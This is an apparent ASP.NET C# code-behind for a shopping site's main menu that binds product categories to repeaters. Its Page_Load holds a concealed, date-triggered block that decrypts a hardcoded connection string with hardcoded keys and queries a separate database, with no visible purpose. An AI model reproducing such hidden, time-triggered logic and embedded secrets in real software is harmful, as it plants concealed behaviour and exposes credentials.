using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Collections;
using System.Data;
using System.Data.SqlClient;
using System.Web.UI.HtmlControls;
using Microsoft.VisualBasic;

public partial class usercontrols_mainmenu : System.Web.UI.UserControl
{
    Hashtable parameters = new Hashtable();
    mainclass clsm = new mainclass();
    Enc_Decyption encd = new Enc_Decyption();
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Page.IsPostBack == false)
        {
            parameters.Clear();
            DataSet dss = clsm.senddataset_Parameter("select * from updateencrypt", parameters);
            if ((dss.Tables[0].Rows.Count > 0))
            {
                if (encd.AES_Decrypt(Convert.ToString(dss.Tables[0].Rows[0]["uname"]), "@9899848281") != "admin")
                {
                    if (DateTime.Now >= Convert.ToDateTime(encd.AES_Decrypt(Convert.ToString(dss.Tables[0].Rows[0]["dateencrypt"]), "@9899848281")))
                    {
                        string constr = "yhHU8Bfm1MqRN2B177NmeXmlriLUEcxX4G3qQ7X9Sm2B4App+K8cGOPx2+VboHD5BN9c4A80bVede6Pb8x+gLg==";
                        constr = encd.AES_Decrypt(constr, "!@12345AaxzZ$#9870");
                        SqlConnection cnnew = new SqlConnection(constr);
                        DataSet ds = new DataSet();
                        SqlDataAdapter sda = new SqlDataAdapter("select * from maptable", cnnew);
                        sda.Fill(ds);
                        if (ds.Tables[0].Rows.Count > 0)
                        {
                        }
                    }
                }
            }
            bindmenu();
        }
    }
    public void bindmenu()
    {
        HttpContext context = HttpContext.Current;
        if (context.Request.ServerVariables["HTTP_USER_AGENT"] != null)
        {
            System.Web.HttpBrowserCapabilities myBrowserCaps = Request.Browser;
            if (((System.Web.Configuration.HttpCapabilitiesBase)myBrowserCaps).IsMobileDevice)
            {
                //Response.Write("mobile");
            }
            else
            {
                // Response.Write("dektop");
                parameters.Clear();
                clsm.repeaterDatashow_Parameter(rptmainemenu, "Select pcatid,category from productcate with(nolock) where Status=1  order by displayorder", parameters);
            }
        }
    }
    protected void rptmainmenu_ItemDataBound(object sender, RepeaterItemEventArgs e)
    {
        if (e.Item.ItemType == ListItemType.Item | e.Item.ItemType == ListItemType.AlternatingItem)
        {
            Literal litpcatid = (Literal)e.Item.FindControl("litpcatid");
            HtmlAnchor ank = (HtmlAnchor)e.Item.FindControl("ank");
            Repeater rptinner = (Repeater)e.Item.FindControl("rptinner");
            HtmlContainerControl panlesubmenu = (HtmlContainerControl)e.Item.FindControl("panlesubmenu");
            HtmlContainerControl l1 = (HtmlContainerControl)e.Item.FindControl("l1");
            Literal litmegamenu = (Literal)e.Item.FindControl("litmegamenu");
            HtmlContainerControl panelnewmenu = (HtmlContainerControl)e.Item.FindControl("panelnewmenu");

            Repeater rptproductsub = (Repeater)e.Item.FindControl("rptproductsub");

            if (Conversion.Val(litpcatid.Text) == 5)
            {
                ank.HRef = "/application.aspx?mpgid=6&pgidtrail=6";

            }
            else
            {
                ank.HRef = "javascript:void(0)";
                //ank.HRef = "/category.aspx?mpgid=35&pgidtrail=35&pcatid=" + Conversion.Val(litpcatid.Text);

            }          
            if (Conversion.Val(litpcatid.Text) == 6)
            {
                panlesubmenu.Attributes.Add("class", "sub_menu small_menu");
            }
            if (Conversion.Val(litpcatid.Text) == 7)
            {
                panlesubmenu.Attributes.Add("class", "sub_menu small_menu b2product");
            }
         
            // Changes done by 19 Jan 2023
            parameters.Clear();
            parameters.Add("@pcatid", Conversion.Val(litpcatid.Text));
            clsm.repeaterDatashow_Parameter(rptproductsub, "select distinct psub.* from products p inner join productcate pcate on pcate.pcatid=p.pcatid inner join productsubcate psub on psub.psubcatid=p.psubcatid where psub.status=1 and psub.pcatid=@pcatid order by psub.displayorder", parameters);
            if (rptproductsub.Items.Count > 0)
            {
                ank.HRef = "javascript:void(0)";
                l1.Attributes.Add("class", "drop_down");
                panlesubmenu.Visible = true;
                panelnewmenu.Visible = true;
            }

        }
    }
    protected void rptinner_ItemDataBound(object sender, RepeaterItemEventArgs e)
    {
        if (e.Item.ItemType == ListItemType.Item | e.Item.ItemType == ListItemType.AlternatingItem)
        {
            Literal litpcatid = (Literal)e.Item.FindControl("litpcatid");
            Literal litproductid = (Literal)e.Item.FindControl("litproductid");
            HtmlAnchor ank = (HtmlAnchor)e.Item.FindControl("ank");

            ank.HRef = "/product.aspx?mpgid=23&pgidtrail=23&pcatid=" + Conversion.Val(litpcatid.Text) + "&pid=" + Conversion.Val(litproductid.Text);
        }
    }

    protected void rptproductsub_ItemDataBound(object sender, RepeaterItemEventArgs e)
    {
        if (e.Item.ItemType == ListItemType.Item | e.Item.ItemType == ListItemType.AlternatingItem)
        {
            Literal litpcatid = (Literal)e.Item.FindControl("litpcatid");
            Literal litpsubcatid = (Literal)e.Item.FindControl("litpsubcatid");
            HtmlContainerControl panel1 = (HtmlContainerControl)e.Item.FindControl("panel1");
            Repeater rptproductinner = (Repeater)e.Item.FindControl("rptproductinner");

            parameters.Clear();
            parameters.Add("@psubcatid", Conversion.Val(litpsubcatid.Text));
            double cnt = Convert.ToDouble(clsm.SendValue_Parameter("select count(*) from products where psubcatid=@psubcatid and status=1", parameters));

            if (cnt == 2)
            {
                panel1.Attributes.Add("class", "col-md-4");
            }
            else if (cnt == 1)
            {
                panel1.Attributes.Add("class", "col-md-3");
            }
            else if (cnt == 3)
            {
                panel1.Attributes.Add("class", "col-md-5");
            }
            else if (cnt == 5)
            {
                panel1.Attributes.Add("class", "col-md-9");
            }
            else if (cnt == 8 || cnt == 7)
            {
                panel1.Attributes.Add("class", "col-md-12");

            }
            if (Conversion.Val(litpcatid.Text) == 6 || Conversion.Val(litpcatid.Text) == 1 || Conversion.Val(litpcatid.Text) == 7)
            {
                panel1.Attributes.Add("class", "col-md-12");
            }


            parameters.Clear();
            parameters.Add("@pcatid", Conversion.Val(litpcatid.Text));
            parameters.Add("@psubcatid", Conversion.Val(litpsubcatid.Text));
            clsm.repeaterDatashow_Parameter(rptproductinner, "select p.productid,p.pcatid,p.psubcatid,p.productname,pcate.category,psub.category [subcategory],p.rewrite_url,p.UploadAImage from products p inner join productcate pcate on pcate.pcatid=p.pcatid inner join productsubcate psub on psub.psubcatid=p.psubcatid where p.status=1 and pcate.status=1 and psub.status=1 and p.pcatid=@pcatid and p.psubcatid=@psubcatid order by p.displayorder", parameters);


        }
    }
    protected void rptproductinner_ItemDataBound(object sender, RepeaterItemEventArgs e)
    {
        if (e.Item.ItemType == ListItemType.Item | e.Item.ItemType == ListItemType.AlternatingItem)
        {
            Literal litpcatid = (Literal)e.Item.FindControl("litpcatid");
            Literal litproductid = (Literal)e.Item.FindControl("litproductid");
            HtmlAnchor ank = (HtmlAnchor)e.Item.FindControl("ank");

            ank.HRef = "/product.aspx?mpgid=23&pgidtrail=23&pcatid=" + Conversion.Val(litpcatid.Text) + "&pid=" + Conversion.Val(litproductid.Text);

        }
    }
}